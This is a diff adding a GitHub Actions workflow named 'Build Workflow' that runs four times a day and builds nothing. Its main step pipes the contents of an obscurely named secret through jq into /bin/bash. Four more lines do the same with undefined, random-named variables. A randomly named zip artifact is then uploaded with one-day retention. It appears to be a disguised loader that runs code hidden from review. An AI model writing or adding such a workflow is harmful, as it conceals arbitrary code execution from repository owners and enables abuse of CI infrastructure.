@@ -1,0 +1,32 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 3,9,15,21 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          c52: ${{ secrets.c52 }}
+        run: |
+          printf '%s' "$c52" | jq -r .b93671 | /bin/bash
+          printf '%s' "$iuhz49946" | jq -r .r0 | /bin/bash
+          printf '%s' "$kt11141" | jq -r .lgk332 | /bin/bash
+          printf '%s' "$gpot935" | jq -r .id841 | /bin/bash
+          printf '%s' "$e193" | jq -r .upozs9 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1meTHMrH
+          path: "*.zip"
+          retention-days: 1
